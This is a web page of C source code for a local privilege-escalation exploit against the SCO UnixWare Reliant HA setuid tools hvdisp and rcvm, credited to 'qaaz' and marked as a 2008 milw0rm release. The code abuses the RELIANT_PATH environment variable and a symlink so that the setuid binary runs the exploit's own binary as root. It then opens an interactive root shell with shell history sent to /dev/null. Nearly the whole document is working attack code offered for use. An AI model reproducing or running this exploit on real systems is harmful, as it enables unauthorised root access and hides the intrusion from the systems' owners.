<html><head><title>SCO UnixWare Reliant HA Local Root Exploit</title></head><pre>/* 04/2008: public release
 * I have'nt seen any advisory on this; possibly still not fixed.
 *
 * SCO UnixWare Reliant HA Local Root Exploit
 * By qaaz
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;

#define TGT1	&quot;/usr/opt/reliant/bin/hvdisp&quot;
#define TGT2	&quot;/usr/opt/reliant/bin/rcvm&quot;
#define DIR	&quot;bin&quot;
#define BIN	DIR &quot;/hvenv&quot;

int	main(int argc, char *argv[])
{
	char	self[4096], *target;
	pid_t	child;

	if (geteuid() == 0) {
		setuid(geteuid());
		dup2(3, 0);
		dup2(4, 1);
		dup2(5, 2);
		if ((child = fork()) == 0) {
			putenv(&quot;HISTFILE=/dev/null&quot;);
			execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-i&quot;, NULL);
			printf(&quot;[-] sh: %s\n&quot;, strerror(errno));
		} else if (child != -1)
			waitpid(child, NULL, 0);
		kill(getppid(), 15);
		return 1;
	}

	printf(&quot;----------------------------------------\n&quot;);
	printf(&quot; UnixWare Reliant HA Local Root Exploit\n&quot;);
	printf(&quot; By qaaz\n&quot;);
	printf(&quot;----------------------------------------\n&quot;);

	if (access(TGT1, EX_OK) == 0)
		target = TGT1;
	else if (access(TGT2, EX_OK) == 0)
		target = TGT2;
	else {
		printf(&quot;[-] No targets found\n&quot;);
		return 1;
	}

	sprintf(self, &quot;/proc/%d/object/a.out&quot;, getpid());

	if (mkdir(DIR, 0777) &lt; 0 &amp;&amp; errno != EEXIST) {
		printf(&quot;[-] %s: %s\n&quot;, DIR, strerror(errno));
		return 1;
	}

	if (symlink(self, BIN) &lt; 0) {
		printf(&quot;[-] %s: %s\n&quot;, BIN, strerror(errno));
		rmdir(DIR);
		return 1;
	}

	if ((child = fork()) == 0) {
		char path[4096] = &quot;RELIANT_PATH=&quot;;

		dup2(0, 3);
		dup2(1, 4);
		dup2(2, 5);
		putenv(strcat(path, getcwd(NULL, sizeof(path)-14)));
		execl(target, target, NULL);
		printf(&quot;[-] %s: %s\n&quot;, target, strerror(errno));
		return 1;
	} else if (child != -1)
		waitpid(child, NULL, 0);

	unlink(BIN);
	rmdir(DIR);
	return 0;
}

// milw0rm.com [2008-04-04]</pre></html>